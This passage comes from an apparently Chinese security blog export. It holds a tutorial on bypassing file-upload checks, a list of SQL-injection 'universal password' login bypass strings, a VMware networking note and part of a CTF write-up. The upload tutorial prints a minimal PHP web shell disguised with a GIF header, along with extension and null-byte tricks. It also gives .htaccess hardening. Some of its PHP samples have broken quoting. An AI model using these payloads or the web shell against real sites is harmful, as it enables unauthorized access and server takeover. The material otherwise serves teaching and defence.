<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.modular.invmod(<span class="number">5</span>,<span class="number">24</span>))</span><br><span class="line"></span><br><span class="line">result: <span class="number">5</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>其它函数请看github项目里的说明。<br />
github地址：<a href="https://github.com/hellman/libnum" target="_blank" rel="noopener">https://github.com/hellman/libnum</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>libnum库</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞绕过技巧</title>
    <url>/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="一-文件上传漏洞介绍"><a class="markdownIt-Anchor" href="#一-文件上传漏洞介绍"></a> 一、文件上传漏洞介绍</h1>
<p>通常web 站点会有用户注册功能，而当用户登入之后大多数情况下都会存在类似头像上传、附件上传一类的功能，这些功能点往往存在上传验证方式不严格的安全缺陷，是在web 渗透中非常关键的突破口，只要经过仔细测试分析来绕过上传验证机制，往往会造成被攻击者直接上传web 后门，进而控制整个web 业务的控制权，复杂一点的情况是结合webserver 的解析漏洞来上传后门获取权限。</p>
<h1 id="二-验证方法与绕过"><a class="markdownIt-Anchor" href="#二-验证方法与绕过"></a> 二、验证方法与绕过</h1>
<h2 id="11content-length验证"><a class="markdownIt-Anchor" href="#11content-length验证"></a> 1.1CONTENT-LENGTH验证</h2>
<p>Content-Length验证是指服务器会对上传的文件内容长度进行检查，超出限制大小的文件将不允许被上传。虽然这种类型的验证不是很受欢迎，但在一些应用的文件上传中也时常能碰到。<br />
示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">30</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="12content-length绕过"><a class="markdownIt-Anchor" href="#12content-length绕过"></a> 1.2CONTENT-LENGTH绕过</h2>
<ol>
<li>针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，（Web服务器上的最大长度限制，我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围）。</li>
<li>如果截断上传文件最大大小，修改文件大小的限制，然后再发送给服务端。</li>
</ol>
<h2 id="21客户端javascript-检测通常为检测文件扩展名"><a class="markdownIt-Anchor" href="#21客户端javascript-检测通常为检测文件扩展名"></a> 2.1客户端javascript 检测(通常为检测文件扩展名)</h2>
<p>顾名思义，就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传。<br />
有两种策略:黑名单策略，文件扩展名在黑名单中的为不合法。<br />
示例代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>,<span class="string">'$_POST['</span>filename<span class="string">']);</span></span><br><span class="line"><span class="string">if($postfix=='</span>php<span class="string">'||$postfix=='</span>asp<span class="string">'||$postfix=='</span>sh<span class="string">')&#123;</span></span><br><span class="line"><span class="string">echo "invalid file type";</span></span><br><span class="line"><span class="string">return;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>白名单策略，文件扩展名不在白名单中的均为不合法。<br />
示例代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>,<span class="string">'$_POST['</span>filename<span class="string">']);</span></span><br><span class="line"><span class="string">if($postfix=='</span>jpg<span class="string">'||$postfix=='</span>png<span class="string">'||$postfix=='</span>gif<span class="string">')&#123;</span></span><br><span class="line"><span class="string">//save the file and do something next</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo "invalid file type";</span></span><br><span class="line"><span class="string">return;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="21客户端javascript"><a class="markdownIt-Anchor" href="#21客户端javascript"></a> 2.1客户端javascript</h2>
<p>黑名单绕过:<br />
通过上传不受欢迎的php扩展来绕过黑名单。<br />
例如：pht，phpt，phtml，php3，php4，php5，php6。<br />
白名单绕过:<br />
通过某种类型的技巧来绕过白名单，例如添加空字节注入（shell.php％00.gif），或使用双重扩展来上传文件（shell.jpg.php）。<br />
此外，我们还可以尝试扩展名大小写来绕过，例如：pHp，Php，phP</p>
<p>白名单策略是更加安全的，通过限制上传类型为只有我们接受的类型，可以较好的保证安全，因为黑名单我们可以使用各种方法来进行注入和突破。</p>
<h2 id="3-服务端mime-类型检测检测content-type-内容"><a class="markdownIt-Anchor" href="#3-服务端mime-类型检测检测content-type-内容"></a> 3. 服务端MIME 类型检测(检测Content-Type 内容)</h2>
<p>如：  content-Type:aplication/x-php<br />
绕过方法：<br />
改为如下类型：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/jpg</span><br><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/png</span><br><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/jpeg</span><br><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/gif</span><br></pre></td></tr></table></figure>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">常用的MIMETYPE表</span><br><span class="line"><span class="built_in">text</span>/plain（纯文本）</span><br><span class="line"><span class="built_in">text</span>/html（HTML文档）</span><br><span class="line"><span class="built_in">text</span>/javascript（js代码）</span><br><span class="line"><span class="built_in">application</span>/xhtml+xml（XHTML文档）</span><br><span class="line">image/gif（GIF图像）</span><br><span class="line">image/jpeg（JPEG图像）</span><br><span class="line">image/png（PNG图像）</span><br><span class="line">video/mpeg（MPEG动画）</span><br><span class="line"><span class="built_in">application</span>/octet-stream（二进制数据）</span><br><span class="line"><span class="built_in">application</span>/pdf（PDF文档）</span><br><span class="line"><span class="built_in">application</span>/(编程语言) 该种语言的代码</span><br><span class="line"><span class="built_in">application</span>/msword（Microsoft Word文件）</span><br><span class="line">message/rfc822（RFC <span class="number">822</span>形式）</span><br><span class="line">multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</span><br><span class="line"><span class="built_in">application</span>/x-www-form-urlencoded（POST方法提交的表单）</span><br><span class="line">multipart/form-data（POST提交时伴随文件上传的表单）</span><br></pre></td></tr></table></figure>
<h2 id="4分析文件头内容来检查文件类型"><a class="markdownIt-Anchor" href="#4分析文件头内容来检查文件类型"></a> 4.分析文件头内容来检查文件类型</h2>
<p>一种检查类型的方式是使用对于文件内容的验证机制，这种方法利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。可以通过比如php的exif_imagetype()函数<br />
一个通过这种方法来过滤的示例代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! exif_imagetype($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File is not an image"</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绕过方法：<br />
给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：</p>
<p>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">&lt;? </span><br><span class="line">php echo shell_exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<p>图片文件通常有称作幻数的头字节，我们来看一下几种图片文件的幻数：<br />
（注意！下面是二进制而不是文本格式的数据）<br />
JPG</p>
<p>PNG</p>
<p>如果是其他类型的二进制文件，也有响应的头字节，如下表</p>
<table>
<thead>
<tr>
<th style="text-align:center">格式</th>
<th style="text-align:center">文件头</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">TIFF (tif)</td>
<td style="text-align:center">49492A00</td>
</tr>
<tr>
<td style="text-align:center">Windows Bitmap (bmp)</td>
<td style="text-align:center">424D</td>
</tr>
<tr>
<td style="text-align:center">CAD (dwg)</td>
<td style="text-align:center">41433130</td>
</tr>
<tr>
<td style="text-align:center">Adobe Photoshop (psd)</td>
<td style="text-align:center">38425053</td>
</tr>
<tr>
<td style="text-align:center">Rich Text Format (rtf)</td>
<td style="text-align:center">7B5C727466</td>
</tr>
<tr>
<td style="text-align:center">MS Word/Excel (xls.or.doc)</td>
<td style="text-align:center">D0CF11E0</td>
</tr>
<tr>
<td style="text-align:center">MS Access (mdb)</td>
<td style="text-align:center">5374616E64617264204A</td>
</tr>
<tr>
<td style="text-align:center">ZIP Archive (zip)</td>
<td style="text-align:center">504B0304</td>
</tr>
<tr>
<td style="text-align:center">RAR Archive (rar)</td>
<td style="text-align:center">52617221</td>
</tr>
<tr>
<td style="text-align:center">Wave (wav)</td>
<td style="text-align:center">57415645</td>
</tr>
<tr>
<td style="text-align:center">AVI (avi)</td>
<td style="text-align:center">41564920</td>
</tr>
<tr>
<td style="text-align:center">Real Media (rm)</td>
<td style="text-align:center">2E524D46</td>
</tr>
<tr>
<td style="text-align:center">MPEG (mpg)</td>
<td style="text-align:center">000001BA</td>
</tr>
<tr>
<td style="text-align:center">MPEG (mpg)</td>
<td style="text-align:center">000001B3</td>
</tr>
<tr>
<td style="text-align:center">Quicktime (mov)</td>
<td style="text-align:center">6D6F6F76</td>
</tr>
<tr>
<td style="text-align:center">Adobe Acrobat (pdf)</td>
<td style="text-align:center">255044462D312E</td>
</tr>
<tr>
<td style="text-align:center">Windows Media (asf)</td>
<td style="text-align:center">3026B2758E66CF11</td>
</tr>
<tr>
<td style="text-align:center">MIDI (mid)</td>
<td style="text-align:center">4D546864</td>
</tr>
</tbody>
</table>
<h2 id="5文件加载检测"><a class="markdownIt-Anchor" href="#5文件加载检测"></a> 5.文件加载检测</h2>
<p>一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，再变态点的甚至是进行二次渲染(后面会提到)。<br />
对渲染/加载测试的攻击方式是代码注入绕过；对二次渲染的攻击方式是攻击文件加载器自身。<br />
先说下对渲染/加载测试攻击-代码注入绕过,可以用图像处理软件对一张图片进行代码注入。用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的。</p>
<p>但如果碰到变态的二次渲染,基本上就没法绕过了，估计就只能对文件加载器进行攻击了。<br />
一般进行遇到二次渲染，想绕过，它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。能想到的一个思路就是基于数据二义性，即让数据既是图像数据也包含一句话木马代码，就像shellcode 通过数据二义性绕过IDS 检测特殊字符一样的道理。<br />
如果要对文件加载器进行攻击，常见的就是溢出攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出如果要对文件加载器进行攻击，常见的就是溢出攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出。<br />
总之对文件完整性检测的绕过，通常就直接用个结构完整的文件进行代码注入即可没必要再去测到底是检查的幻数还是文件头结构之类的了。<br />
解析攻击<br />
攻击角度来分是这样的:<br />
直接解析(完全没防御或有一点简单的防御)<br />
比如我们直接就可以上传一个扩展名是.php的文件,只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。<br />
配合解析(有一定程度的防御)<br />
我们可以理解为先代码注入到服务器上，上传一个带有一句话木马的图片或文件之类<br />
让它待在某个位置，等待这一个解析的配合。(比如php 的文件包含解析，web 服务器的解析漏洞，.htaccess 解析等)</p>
<p>本地文件包含解析<br />
主要是php 的本地文件包含(远程文件包含不属于上传攻击绕过范畴)</p>
<p>htaccess解析<br />
就不用多说了，看看之前.htaccess 文件攻击的那个案例,用户自己定义如何去调用解析器解析文件就可以了。<br />
web应用程序解析漏洞以及其原理</p>
<p>Apache 解析漏洞<br />
解析: test.php.任意不属于黑名单且也不属于Apache解析白名单的名称<br />
描述: 一个文件名为x1.x2.x3 的文件，Apache 会从x3 的位置往x1 的位置开始尝试解析,<br />
如果x3 不属于Apache 能解析的扩展名，那么Apache会尝试去解析x2 的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止</p>
<p>IIS 解析漏洞<br />
解析- test.asp/任意文件名|test.asp; 任意文件名| 任意文件名/任意文件名.php<br />
描述- IIS6.0 在解析asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp 去解析，另一个是只要文件名中含有”.asp;”会优先按asp 来解析。<br />
IIS7.0/7.5 是对php 解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php 的方式去解析。</p>
<p>Nginx 解析漏洞<br />
解析- 任意文件名/任意文件名.php | 任意文件名%00.php<br />
描述- 目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php<br />
的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php 进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p>
<h2 id="6限制web-server对于特定类型文件的行为"><a class="markdownIt-Anchor" href="#6限制web-server对于特定类型文件的行为"></a> 6.限制Web Server对于特定类型文件的行为</h2>
<p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般来说，用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。<br />
大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例：<br />
在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码，因此可以使用服务器程序的接口来进行限制。<br />
以Apache为例,我们可以利用 .htaccess 文件机制来对web server行为进行限制<br />
在这里插一句，如果不是专门的文件下载目录，请务必关掉文件夹浏览的权限，以防止嗅探和可能的越权，也是使用.htaccess文件，在其中加上一句</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">Options</span></span> <span class="literal">All</span> -Indexes</span><br></pre></td></tr></table></figure>
<p>即可。<br />
禁止脚本执行有多种方式可以实现，而且分别有不同的效果，我们分别来看一下</p>
<ol>
<li>指定特定扩展名的文件的处理方式,原理是指定Response的Content-Type可以加上如下几行</li>
</ol>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">AddType text/plain <span class="string">.pl</span> <span class="string">.py</span> <span class="string">.php</span></span><br></pre></td></tr></table></figure>
<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type<br />
2. 如果要完全禁止特定扩展名的文件被访问，用下面的几行</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Options</span> <span class="selector-tag">-ExecCGI</span></span><br><span class="line"><span class="selector-tag">AddHandler</span> <span class="selector-tag">cgi-script</span> <span class="selector-class">.php</span> <span class="selector-class">.pl</span> <span class="selector-class">.py</span> <span class="selector-class">.jsp</span> <span class="selector-class">.asp</span> <span class="selector-class">.htm</span> <span class="selector-class">.shtml</span> <span class="selector-class">.sh</span> <span class="selector-class">.cgi</span>识别</span><br></pre></td></tr></table></figure>
<p>在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误<br />
3. 也可以强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$"&gt;</span></span><br><span class="line"><span class="attribute">ForceType</span> text/plain</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
<p>看代码就可以很明白的知道，符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。<br />
4. 只允许访问特定类型的文件</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">order</span></span> deny,allow</span><br><span class="line"><span class="attribute"><span class="nomarkup">deny</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
<p>在一个上传图片的文件夹下面，就可以加上这段代码，使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问。<br />
这又是一个白名单的处理方案。<br />
永远记得，白名单是最有保障的安全措施。</p>
<h1 id="三-反制"><a class="markdownIt-Anchor" href="#三-反制"></a> 三、反制</h1>
<p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p>
<blockquote>
<p>转载于:<a href="https://www.cnblogs.com/-wenli/p/9911556.html" target="_blank" rel="noopener">https://www.cnblogs.com/-wenli/p/9911556.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>万能密码漏洞</title>
    <url>/WEB%E5%AE%89%E5%85%A8/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h2>
<p>很多网站把用户名和密码放在数据库中，当用户登录网站时，一般采用sql语句查询数据库验证信息。以asp为例</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="string">'username'</span> =<span class="string">'$username'</span> <span class="keyword">and</span> <span class="string">'password'</span> = <span class="string">'$password'</span></span><br></pre></td></tr></table></figure>
<p>其中user是数据空中存放用户信息的表，username是存放用户名的字段，password是存放密码的字段。<br />
当用户输入输入 ‘or’’ ='时，sql语句语句就变成了</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="string">'username'</span> = <span class="string">''</span><span class="keyword">or</span><span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="string">'password'</span> = <span class="string">'$password'</span></span><br></pre></td></tr></table></figure>
<p>由于’’ = ''恒成立，所以where所指条件成立，因而可以绕过身份验证。<br />
万能密码中开头和结尾的单引号，主要是为了将查询语句中引用变量的单引号闭合，注意此处不能使用双引号，在查询语句中，双引号只能使其中的变量变成字符。</p>
<h2 id="常用万能密码"><a class="markdownIt-Anchor" href="#常用万能密码"></a> 常用万能密码</h2>
<p>asp，aspx万能密码</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>：<span class="string">"or "</span>a<span class="string">"="</span>a</span><br><span class="line"><span class="number">2</span>：')or('a'='a</span><br><span class="line"><span class="number">3</span>：or <span class="number">1</span>=<span class="number">1</span>–</span><br><span class="line"><span class="number">4</span>：'or 1=1–</span><br><span class="line">5：a'or' 1=1–</span><br><span class="line">6："or 1=1–</span><br><span class="line">7：or 'a'='a</span><br><span class="line"><span class="number">8</span>： <span class="string">"or "</span>=<span class="string">"a'='a</span></span><br><span class="line"><span class="number">9</span>：'or"=''</span><br><span class="line">10：'or'='or'</span><br><span class="line">11: 1 or '<span class="number">1</span>'='<span class="number">1</span>'=1</span><br><span class="line">12: 1 or '<span class="number">1</span>'='<span class="number">1</span>' or 1=1</span><br><span class="line">13: 'OR <span class="number">1</span>=<span class="number">1</span>%<span class="number">00</span></span><br><span class="line"><span class="number">14</span>: <span class="string">"or 1=1%00</span></span><br><span class="line"><span class="number">15</span>: <span class="string">"xor</span></span><br><span class="line"><span class="number">16</span>: 新型万能登陆密码</span><br><span class="line">用户名' UNION Select 1,1,1 FROM admin Where "=' （替换表名admin）</span><br><span class="line">密码 <span class="number">1</span></span><br><span class="line">Username=-<span class="number">1</span>%cf' union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">Password=1</span><br><span class="line">17: admin' or 'a'='a 密码随便</span><br></pre></td></tr></table></figure>
<p>PHP万能密码</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">1:</span> <span class="string">‘or’=’or’</span></span><br><span class="line"><span class="attr">2:</span> <span class="string">‘or</span> <span class="number">1</span><span class="string">=1/*</span> <span class="string">字符型</span> <span class="string">GPC是否开都可以使用</span></span><br><span class="line"><span class="attr">3: User:</span> <span class="string">something</span></span><br><span class="line"><span class="attr">4: Pass:</span> <span class="string">‘</span> <span class="string">OR</span> <span class="string">‘1’=’1</span></span><br></pre></td></tr></table></figure>
<p>jsp 万能密码</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="number">1</span>’<span class="keyword">or</span>’<span class="number">1</span>’=’<span class="number">1</span></span><br><span class="line"><span class="number">2</span>: admin’ OR <span class="number">1</span>=<span class="number">1</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">用户名：admin 系统存在这个用户的时候 才用得上</span></span><br><span class="line"><span class="comment">密码：1’or’1’=’1</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>万能密码</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware中的网络模式</title>
    <url>/VMware/VMware%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="桥接模式"><a class="markdownIt-Anchor" href="#桥接模式"></a> 桥接模式</h2>
<ol>
<li>桥接模式是比较常用的一种网络模式，用来设置虚拟机与主机具有相同的网络地位。前提是需要在动态分配IP地址网络中，如果在静态分配IP地址的网络中，需要手动设置对应的IP地址。</li>
<li>虚拟机中设置桥接模式： 点击虚拟机，点击网络适配器，选择桥接模式。</li>
<li>对应主机的网卡：VMware Network Adapter VMnet0</li>
</ol>
<h2 id="nat模式"><a class="markdownIt-Anchor" href="#nat模式"></a> nat模式</h2>
<ol>
<li>NAT网络地址转换，主机与虚拟机构成一个网络，虚拟机可以通过主机与主机以外的网络通信，但主机以外的网络无法与虚拟机通信，例如：局域网。</li>
<li>对外虚拟机的IP地址即为主机的IP地址。</li>
<li>虚拟机中设置nat模式： 点击虚拟机，点击网络适配器，选择nat模式。</li>
<li>对应主机的网卡：VMware Network Adapter VMnet8</li>
</ol>
<h2 id="仅主机模式"><a class="markdownIt-Anchor" href="#仅主机模式"></a> 仅主机模式</h2>
<ol>
<li>虚拟机完全封闭，不与外部网络通信，但是可以与当前主机进行通信。</li>
<li>虚拟机中设置仅主机模式： 点击虚拟机，点击网络适配器，选择仅主机模式。</li>
<li>对应主机的网卡：VMware Network Adapter VMnet1</li>
</ol>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>网络配置</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF writeup</title>
    <url>/CTF/writeup06/</url>
    <content><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1>
<h2 id="eamisc"><a class="markdownIt-Anchor" href="#eamisc"></a> eamisc</h2>
<p><strong>题目：</strong> Flag到底在哪嘞？<br />
<strong>解题思路：</strong> 打开发现png格式图片，猜测高度被改写，写脚本进行CRC爆破，得到高度。<br />
<img src="https://img-blog.csdnimg.cn/20200330151346684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="cyberpunk"><a class="markdownIt-Anchor" href="#cyberpunk"></a> CyberPunk</h2>
<p><strong>题目：</strong>  Hacking_security!<br />
<strong>解题思路：</strong>  打开执行文件，发现需要的运行时间是2020年9月17日，直接更改系统时间，即可得到flag，MRCTF{We1cOm3_70_cyber_security}</p>
<h2 id="千层套路"><a class="markdownIt-Anchor" href="#千层套路"></a> 千层套路</h2>
<p><strong>题目：</strong>  套娃题 淦！<br />
<strong>解题思路：</strong>  套娃题，直接上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile,os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span><span class="params">(zipname)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname.split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line">        zf = zipfile.ZipFile(zipname,<span class="string">'r'</span>)</span><br><span class="line">        zf.extractall(pwd=passwd.encode())</span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>]</span><br><span class="line">        zf.close()</span><br><span class="line">unzip(<span class="string">"qctl.zip"</span>)</span><br></pre></td></tr></table></figure>
<p>得到qr.txt，打开发现是rgb值，想到rgb转成二维码，上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">200</span>    <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">200</span>    <span class="comment">#y坐标  x * y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))   <span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">'qr.txt'</span>)    <span class="comment">#打开rbg值的文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过每个rgb点生成图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment">#获取一行的rgb值</span></span><br><span class="line">        line = line.replace(<span class="string">"("</span>,<span class="string">""</span>)</span><br><span class="line">        line = line.replace(<span class="string">")\n"</span>,<span class="string">""</span>)</span><br><span class="line">        rgb = line.split(<span class="string">", "</span>)  <span class="comment">#分离rgb，文本中逗号后面有空格</span></span><br><span class="line">        im.putpixel((i, j), (int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]), int(rgb[<span class="number">2</span>])))    <span class="comment">#将rgb转化为像素</span></span><br><span class="line"></span><br><span class="line">im.show()   <span class="comment">#也可用im.save('flag.jpg')保存下来</span></span><br></pre></td></tr></table></figure>
<p>得到一张二维码图片扫描，得flag。</p>
<p>MRCTF{ta01uyout1nreet1n0usandtimes}。</p>
<h2 id="你能看懂音符吗"><a class="markdownIt-Anchor" href="#你能看懂音符吗"></a> 你能看懂音符吗</h2>
<p><strong>题目：</strong>  希望你可以参透这音符的奥秘。<br />
<strong>解题思路：</strong>  打开压缩包，发现压缩包损坏，用winhex查看，发现文件头错误，将前两个数字与第三第四个数据互换即可。</p>
<p><img src="https://img-blog.csdnimg.cn/20200330151452413.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
打开发现word中提示“呀！一不小心把文档里的东西弄没了”，猜测文字被隐藏，点击选项，找到显示，勾选隐藏文字，发现一串音符，进行音符在线解密。</p>
<p>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖<br />
¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</p>
<p>解密地址：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</a></p>
<p><img src="https://img-blog.csdnimg.cn/20200330151527443.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<p>得到flag。MRCTF{thEse_n0tes_ArE_am@zing~}</p>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<h2 id="古典密码知多少"><a class="markdownIt-Anchor" href="#古典密码知多少"></a> 古典密码知多少</h2>
<p><strong>题目：</strong>  佛曰：迦呐那侄耨盡切訶呐帝梵竟缽密俱彌穆曳罰呼迦孕諳婆<br />
